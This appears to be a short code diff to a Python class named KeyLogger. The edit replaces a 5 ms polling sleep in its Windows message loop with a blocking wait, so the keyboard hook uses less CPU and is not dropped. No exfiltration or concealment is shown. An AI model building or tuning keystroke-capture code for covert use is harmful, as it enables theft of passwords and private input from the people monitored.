@@ -154,7 +154,12 @@ class KeyLogger:
                 ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                 ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
             else:
-                time.sleep(0.005)
+                # Block until keyboard input arrives or 50ms pass. Polling at
+                # 5ms kept a core warm for nothing; 50ms is still far below the
+                # LowLevelHooksTimeout so the hook never gets dropped.
+                ctypes.windll.user32.MsgWaitForMultipleObjectsEx(
+                    0, None, 50, 0x04FF, 0  # QS_ALLINPUT
+                )
             if time.monotonic() - last_flush >= self.flush_secs:
                 self.flush()
                 last_flush = time.monotonic()
